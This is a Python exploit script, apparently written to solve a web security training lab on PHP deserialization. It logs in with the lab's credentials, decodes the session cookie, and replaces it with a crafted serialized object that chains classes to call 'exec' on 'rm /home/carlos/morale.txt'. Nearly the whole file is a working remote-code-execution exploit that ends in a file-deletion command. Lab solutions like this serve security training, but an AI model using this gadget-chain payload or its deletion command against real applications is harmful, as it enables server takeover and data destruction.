# Developing a custom gadget chain for PHP deserialization

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def get_infos(s, url):
	r = s.get(url + '/my-account')
	debug_line = re.search(r'<!--(.*)-->', r.text).group(1)
	print('\n[+] Found Comment on the main page:\t%s' % debug_line)
	template_path = re.search(r'once (.*) is updated', debug_line).group(1) + '~'
	print('[+] Following the template file link: \t\t%s' % template_path)
	r = s.get(url + template_path)
	print(r.text)

def get_cookies(s):
	session = s.cookies['session']
	parsed_session = urllib.parse.unquote(session)
	print('\n[+] Found Session Cookie:\t\t%s' % parsed_session)
	time.sleep(1)
	decoded_session = base64.b64decode(parsed_session).decode()
	print('\n[+] Decoded Session Cookie:\n%s' % decoded_session)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Developing a custom gadget chain for PHP deserialization')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos morale.txt file...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			print('[+] Trying to send a crafted payload...')
			r = connect_as_wiener(s, url)
			get_cookies(s)
			get_infos(s, url)
			payload = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
			print("\n[+] Replacing the cookie by:\n%s" % payload)
			cookie = base64.b64encode(payload.encode()).decode()
			print("\n[+] Base64 Encoding:\n%s" % cookie)
			s.cookies.clear()
			cookies= {'session': cookie}
			print('[+] Sending the request...')
			r = s.get(url, cookies=cookies)
			if r.status_code == 500:
				print('[+] Request sent results to an internal error !')
			time.sleep(2)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
